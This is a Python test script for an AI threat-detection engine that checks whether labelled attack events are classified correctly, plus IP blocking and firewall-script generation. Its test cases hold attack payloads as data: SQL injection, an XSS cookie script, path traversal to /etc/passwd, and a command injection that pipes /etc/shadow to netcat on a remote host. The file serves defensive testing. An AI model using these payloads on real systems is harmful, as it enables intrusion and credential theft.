import sys
import os

# Add project root to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from backend.ml_engine import engine
from backend.defense_handler import defense_matrix
from backend.attack_simulator import simulator

def run_tests():
    print("==================================================")
    print("[*] Running CyberGuard AI Detection Engine Tests")
    print("==================================================")

    test_cases = [
        {
            "name": "SQL Injection Test",
            "event": {"event_type": "web_request", "payload": "admin' OR '1'='1 --", "src_ip": "185.220.101.5", "method": "POST"},
            "expected_threat": "SQL Injection",
            "expected_severity": ["High", "Critical"]
        },
        {
            "name": "Cross-Site Scripting (XSS) Test",
            "event": {"event_type": "web_request", "payload": "<script>alert(document.cookie)</script>", "src_ip": "45.154.255.89"},
            "expected_threat": "Cross-Site Scripting (XSS)",
            "expected_severity": ["High", "Critical"]
        },
        {
            "name": "Path Traversal Test",
            "event": {"event_type": "web_request", "payload": "../../../../etc/passwd", "src_ip": "91.240.118.172"},
            "expected_threat": "Path Traversal",
            "expected_severity": ["High", "Critical"]
        },
        {
            "name": "Command Injection (RCE) Test",
            "event": {"event_type": "web_request", "payload": "; cat /etc/shadow | nc 10.0.0.1 4444", "src_ip": "194.26.29.112"},
            "expected_threat": "Command Injection",
            "expected_severity": ["Critical"]
        },
        {
            "name": "SSH Brute Force Test",
            "event": {"event_type": "auth_log", "failed_logins": 45, "time_window_sec": 15, "username": "root", "src_ip": "103.203.57.10"},
            "expected_threat": "Brute Force",
            "expected_severity": ["High", "Critical"]
        },
        {
            "name": "DDoS Volumetric Flood Test",
            "event": {"event_type": "network_flow", "packets_per_sec": 8500, "bytes_per_sec": 12000000, "syn_ratio": 0.95, "src_ip": "178.62.204.11"},
            "expected_threat": "DDoS",
            "expected_severity": ["Critical"]
        },
        {
            "name": "Port Scan Test",
            "event": {"event_type": "network_flow", "unique_dst_ports": 65, "flow_duration": 1.2, "packets_per_sec": 350, "src_ip": "193.106.191.22"},
            "expected_threat": "Port Scan",
            "expected_severity": ["High", "Critical"]
        },
        {
            "name": "Normal Web Request Test",
            "event": {"event_type": "web_request", "payload": "search=laptop&category=tech", "src_ip": "12.34.56.78"},
            "expected_threat": "Normal",
            "expected_severity": ["Low"]
        }
    ]

    passed = 0
    for i, tc in enumerate(test_cases, 1):
        result = engine.analyze_event(tc["event"])
        threat_match = result["threat_type"] == tc["expected_threat"]
        severity_match = result["severity"] in tc["expected_severity"]
        
        status = "[PASS]" if (threat_match and severity_match) else "[FAIL]"
        if status == "[PASS]":
            passed += 1
            
        print(f"\n[{i}/{len(test_cases)}] {tc['name']} -> {status}")
        print(f"   Detected Threat: {result['threat_type']} (Risk Score: {result['risk_score']}/100, Conf: {result['confidence']}%)")
        print(f"   MITRE ATT&CK: {result['mitre_attack']['technique_id']} - {result['mitre_attack']['technique_name']}")
        print(f"   Plain-English Summary: {result['human_summary']}")

    print("\n==================================================")
    print(f"[*] Test Results: {passed}/{len(test_cases)} Passed ({(passed/len(test_cases))*100:.1f}%)")
    print("==================================================")

    # Test Defense Matrix
    print("\n[*] Testing Defense Matrix & IP Blocklist...")
    defense_matrix.block_ip("185.220.101.5", reason="SQLi attack test", threat_type="SQL Injection")
    assert defense_matrix.is_blocked("185.220.101.5"), "IP should be blocked"
    print("  --> Block IP verified.")
    script = defense_matrix.generate_firewall_script("185.220.101.5", "linux")
    assert "iptables" in script, "Script should contain iptables commands"
    print("  --> Firewall script generator verified.")
    defense_matrix.unblock_ip("185.220.101.5")
    assert not defense_matrix.is_blocked("185.220.101.5"), "IP should be unblocked"
    print("  --> Unblock IP verified.")

    print("\n[SUCCESS] All detection and mitigation subsystems verified successfully!")

if __name__ == "__main__":
    run_tests()
